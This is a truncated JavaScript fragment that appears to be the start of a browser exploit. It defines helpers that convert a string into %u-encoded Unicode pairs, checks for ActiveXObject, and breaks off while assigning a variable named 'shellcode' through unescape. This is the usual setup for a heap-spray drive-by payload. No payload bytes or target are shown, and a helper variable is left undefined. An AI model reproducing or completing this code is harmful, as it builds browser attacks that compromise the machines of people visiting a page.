function d2h(d) {
	var h = hD.substr(d&15,1);
	while(d>15) {d>>=4;h=hD.substr(d&15,1)+h;}
	return h;
}

function ec(ci) {
	if (ci.length % 2 != 0) {
		ul = ci + "?";
		}
	else {
		ul = ci;
	}
	cd = "%u";
	for (i=0;i<ul.length;i++) {
		cd = cd + d2h(ul.charCodeAt(i));
		if (i % 2 != 0 && i != ul.length-1) {
			cd = cd + "%u";
			}

		}
	return cd;
}

if (!window.ActiveXObject) {

	shellcode = unescape( 
